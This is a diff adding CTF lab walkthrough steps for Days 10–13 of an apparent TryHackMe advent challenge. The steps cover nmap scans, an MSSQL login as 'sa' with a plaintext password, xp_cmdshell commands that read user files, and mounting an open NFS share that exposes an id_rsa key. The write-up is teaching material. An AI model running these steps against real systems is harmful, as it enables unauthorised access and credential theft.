@@ -110,34 +110,116 @@ Answer:
 
 ## Day 10: Offensive Is The Best Defence
 
+scan the target
 
+```
+nmap -A -T4 10.10.235.19
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/08081878-5821-4e8c-aa67-83063f91fd6b)
 
+search for the CVE number of the vulnerability that was solved in version 2.4.51
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/35802860-639b-480b-b642-ca693dd32715)
 
+scan all ports
 
+```
+nmap -sS -T4 -p- 10.10.235.19
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/21c8add1-9055-40cd-b98b-723a52deba57)
 
+we found a sevice on port 20212
 
+```
+nmap -sS -sV -p 20212 10.10.235.19
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8e1a359a-0500-4bbc-9a51-ce8e0f586de2)
 
+Answer:
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e121db9d-5a21-4dd4-bb58-7429147cdfcc)
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ef449f8e-cadd-4650-b3ee-ece1b9ef0800)
 
+## Day 11: Where Are The Reindeers?
 
+scan the machine
 
+```
+nmap -sS -sV -T4 -Pn 10.10.85.114
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/556969d0-2670-4e13-bd22-7656d2b1dc9b)
 
+connect to sql server
 
+```
+sqsh -S 10.10.85.114 -U sa -P "t7uLKzddQzVjVFJp"
+1> SELECT * FROM reindeer.dbo.names;
+2> go
+3> SELECT * FROM reindeer.dbo.schedule
+4> go
+5> SELECT * FROM reindeer.dbo.presents
+6> go
+```
 
+another thing we can do is xp_cmdshell to execute Windows shell command
 
+```
+xp_cmdshell 'whoami'
+xp_cmdshell 'dir c:\Users\grinch'
+xp_cmdshell 'type c:\Users\grinch\Documents\flag.txt'
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d3e7a140-e7ef-413f-b30f-3fb0cbb71ee3)
 
+Answer:
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3acbc35e-1053-443f-829d-8a4323b2e4da)
 
+## Day 12: Sharing Without Caring
 
+scan the target
 
+```
+nmap -sS -sV -T4 -Pn 10.10.73.165
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/939abb08-fed6-4a13-9013-48e02fc5ea4f)
+
+notice that there is a nfs server at port 2049
+
+```
+showmount -e 10.10.73.165
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2e02782f-c669-437c-bec8-2d29c8fdc1d7)
+
+create a mount to discover it
+
+```
+mkdir tmp
+mount 10.10.73.165:/ tmp
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f1155a82-09bd-40ce-bfa4-a57e98c28386)
+
+on share folder contain 2 text files
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1995474b-3c49-4ae5-a27f-389e80c99ba0)
+
+you can see an id_rsa key on confidential folder
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2ac0ec6a-d8ee-4175-96c0-6c4115a0e19d)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/be172b32-a31e-446b-8161-d7d6911feb63)
+
+## Day 13: They Lost The Plan!
 
 
 
